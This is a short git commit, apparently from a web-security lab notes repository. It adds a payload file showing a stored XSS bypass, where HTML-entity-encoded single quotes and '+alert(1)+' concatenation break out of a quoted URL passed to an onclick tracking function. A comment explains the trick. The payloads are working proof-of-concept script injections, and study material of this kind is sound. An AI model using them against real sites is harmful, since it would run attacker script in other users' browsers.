9425aad7f25d6e435fe71a07d6101bbfa59eb812
senior <jedi>
2023-06-16 17:06:49 +0530

    stored xss onlick encoding escaping concatenating

---
+++ XSS/Stored XSS in onclick event angle brackets double quotes HTML-encoded single quotes backslash escaped/payload.js
@@ -0,0 +1,12 @@
+var tracker={
+    track(){}
+};
+tracker.track('http://www.cream.wutang.com');
+
+&apos;alert(1)&apos;
+
+http://www.cream.wutang.com&apos;+alert(1)+&apos;
+
+//The - can be replaced by +  sign, so both produce the same result acting 
+//as delimiters for the server to differentiate between
+//the track function, alert(1) and the &apos
